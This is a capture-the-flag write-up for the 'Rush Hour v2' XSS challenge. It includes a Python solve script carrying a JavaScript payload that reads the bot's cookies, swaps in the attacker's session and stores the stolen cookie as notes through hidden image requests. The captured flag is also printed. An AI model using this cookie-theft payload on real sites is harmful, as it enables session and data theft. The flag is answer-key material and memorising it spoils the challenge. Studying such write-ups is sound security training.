---
title: Rush Hour v2
solves: 40
points: 426
created: 2025-04-19T03:00
updated: 2025-04-20T19:59
---

Not much is changed from the v1. Except that we now cannot send requests out to some webhook.

```js
page.on('request', (request) => {
  if (!request.url().startsWith("http://127.0.0.1:3000")) {
	request.abort();
  } else {
	request.continue();
  }
});
```

Solution is simple, get the flag, then write it to notes as me the attacker.

After which I can simply visit my own home page and see the flag right there.

```python
# the first parts of Rush Hour 1 unchanged
# ...
uid = register()
print(f"registered user: {uid}")
print("sending payload...")
send_payload("""
console.log("first layer of xss!");
window.sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
window.payload = async () => {
    await add_note();
    const flags = document.cookie;
    
    document.cookie="user="""+uid+""";path=/";
    await clear_notes();
    console.log(document.cookie);
    for(let i=0;i<flags.length;i+=16){
        await add_note(flags.substring(i,i+16));
    }
};
window.add_note = (note) => {
    // add img tag
    let img = document.createElement('img');
    if(note) img.src = 'http://127.0.0.1:3000/create?note=' + encodeURIComponent(note);
    else img.src = 'http://127.0.0.1:3000/';
    img.style.display = 'none';
    document.body.appendChild(img);
    return new Promise((resolve) => {
        img.onload = () => {
            document.body.removeChild(img);
            resolve();
        };
        img.onerror = () => {
            document.body.removeChild(img);
            resolve();
        };
    });
};
window.clear_notes = () => {
    let img = document.createElement('img');
    img.src = 'http://127.0.0.1:3000/clear';
    img.style.display = 'none';
    document.body.appendChild(img);
    return new Promise((resolve) => {
        img.onload = () => {
            document.body.removeChild(img);
            resolve();
        };
        img.onerror = () => {
            document.body.removeChild(img);
            resolve();
        };
    });
};
window.payload();
""")
print("activating payload...")
report_user(uid)
print("waiting for payload to finish...")
time.sleep(7)
print("getting notes...")
print(get_notes())
```

```flag
UMASS{k@hUnA_mY_b310v3D1!!1!}
```
